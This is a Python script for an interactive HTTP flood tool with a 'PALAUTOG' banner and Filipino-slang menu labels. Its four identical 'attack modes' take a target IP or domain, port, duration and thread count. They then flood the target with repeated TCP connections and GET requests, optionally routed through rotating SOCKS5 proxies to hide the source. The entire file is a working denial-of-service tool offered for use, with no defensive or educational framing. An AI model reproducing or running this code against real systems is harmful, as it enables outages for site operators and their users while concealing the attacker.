import random
import time
import threading
import os
from colorama import Fore, Style, init
import socks
import socket

os.system('cls')

def send_packet(target, port, use_proxy=False, proxies=[]):
    try:
        if use_proxy and proxies:
            proxy = random.choice(proxies)
            socks.setdefaultproxy(socks.SOCKS5, proxy[0], proxy[1])
            s = socks.socksocket()
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.settimeout(3)
        s.connect((target, port))
        s.sendall(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
        s.close()
    except Exception as e:
        # Optional debug output (uncomment if needed)
        # print(f"[!] Packet failed: {e}")
        pass

def banner():
    print(Fore.CYAN + """
  _____        _              _    _ _______ ____   _____ 
 |  __ \ /\   | |        /\  | |  | |__   __/ __ \ / ____|
 | |__) /  \  | |       /  \ | |  | |  | | | |  | | |  __ 
 |  ___/ /\ \ | |      / /\ \| |  | |  | | | |  | | | |_ |
 | |  / ____ \| |____ / ____ \ |__| |  | | | |__| | |__| |
 |_| /_/    \_\______/_/    \_\____/   |_|  \____/ \_____|
                                                                                  
    """)

def main_menu():
    print(Fore.YELLOW + "========== MAIN MENU ==========")
    print(Fore.GREEN + "1: UTOG BA")
    print(Fore.GREEN + "2: SALSAL")
    print(Fore.GREEN + "3: TARUB")
    print(Fore.GREEN + "4: TARUB BLACK 7inch")
    print(Fore.GREEN + "5: Exit")
    print(Fore.YELLOW + "================================")

def load_proxies():
    proxies = []
    with open("proxies.txt", "r") as file:
        for line in file:
            line = line.strip()
            if line and ":" in line:
                parts = line.split(":")
                if len(parts) >= 2:
                    ip = ":".join(parts[:-1])  # handles IPv6
                    port = int(parts[-1])
                    proxies.append((ip, port))
    return proxies

def utog_ba():
    print(Fore.GREEN + "[UTOG BA MODE ACTIVATED]" + Style.RESET_ALL)
    target = input("Enter IP/DOMAIN: ")
    port = int(input("Port: "))
    seconds = int(input("Duration in seconds: "))
    threads_count = int(input("How many threads to use: "))
    proxy_choice = input("Use SOCKS5 proxy? (y/n): ").lower()

    use_proxy = proxy_choice == 'y'
    proxies = load_proxies() if use_proxy else []

    if use_proxy and not proxies:
        print(Fore.RED + "[!] No proxies loaded. Check proxies.txt!" + Style.RESET_ALL)
        return

    print(f"Attacking {target}:{port} for {seconds} seconds with {threads_count} threads "
          f"{'using proxies' if use_proxy else 'directly'}...\n")

    end_time = time.time() + seconds

    def attack_loop():
        while time.time() < end_time:
            send_packet(target, port, use_proxy, proxies)

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack_loop)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def salsal():
    print(Fore.GREEN + "[SALSAL MODE ACTIVATED]" + Style.RESET_ALL)
    target = input("Enter IP/DOMAIN: ")
    port = int(input("Port: "))
    seconds = int(input("Duration in seconds: "))
    threads_count = int(input("How many threads to use: "))
    proxy_choice = input("Use SOCKS5 proxy? (y/n): ").lower()

    use_proxy = proxy_choice == 'y'
    proxies = load_proxies() if use_proxy else []

    if use_proxy and not proxies:
        print(Fore.RED + "[!] No proxies loaded. Check proxies.txt!" + Style.RESET_ALL)
        return

    print(f"Attacking {target}:{port} for {seconds} seconds with {threads_count} threads "
          f"{'using proxies' if use_proxy else 'directly'}...\n")

    end_time = time.time() + seconds

    def attack_loop():
        while time.time() < end_time:
            send_packet(target, port, use_proxy, proxies)

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack_loop)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def tarub():
    print(Fore.GREEN + "[TARUB MODE ACTIVATED]" + Style.RESET_ALL)
    target = input("Enter IP/DOMAIN: ")
    port = int(input("Port: "))
    seconds = int(input("Duration in seconds: "))
    threads_count = int(input("How many threads to use: "))
    proxy_choice = input("Use SOCKS5 proxy? (y/n): ").lower()

    use_proxy = proxy_choice == 'y'
    proxies = load_proxies() if use_proxy else []

    if use_proxy and not proxies:
        print(Fore.RED + "[!] No proxies loaded. Check proxies.txt!" + Style.RESET_ALL)
        return

    print(f"Attacking {target}:{port} for {seconds} seconds with {threads_count} threads "
          f"{'using proxies' if use_proxy else 'directly'}...\n")

    end_time = time.time() + seconds

    def attack_loop():
        while time.time() < end_time:
            send_packet(target, port, use_proxy, proxies)

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack_loop)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def tarub_black():
    print(Fore.GREEN + "[TARUB BLACK MODE ACTIVATED]" + Style.RESET_ALL)
    target = input("Enter IP/DOMAIN: ")
    port = int(input("Port: "))
    seconds = int(input("Duration in seconds: "))
    threads_count = int(input("How many threads to use: "))
    proxy_choice = input("Use SOCKS5 proxy? (y/n): ").lower()

    use_proxy = proxy_choice == 'y'
    proxies = load_proxies() if use_proxy else []

    if use_proxy and not proxies:
        print(Fore.RED + "[!] No proxies loaded. Check proxies.txt!" + Style.RESET_ALL)
        return

    print(f"Attacking {target}:{port} for {seconds} seconds with {threads_count} threads "
          f"{'using proxies' if use_proxy else 'directly'}...\n")

    end_time = time.time() + seconds

    def attack_loop():
        while time.time() < end_time:
            send_packet(target, port, use_proxy, proxies)

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack_loop)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def run():
    banner()
    while True:
        main_menu()
        choice = input("Enter your choice (1-5): ")

        if choice == '1':
            utog_ba()
        elif choice == '2':
            salsal()
        elif choice == '3':
            tarub()
        elif choice == '4':
            tarub_black()
        elif choice == '5':
            print("Exiting program... SALSAL NA!")
            break
        else:
            print("Invalid choice. BANO KABA 1 TO 5 LANG YAN.\n")

run()
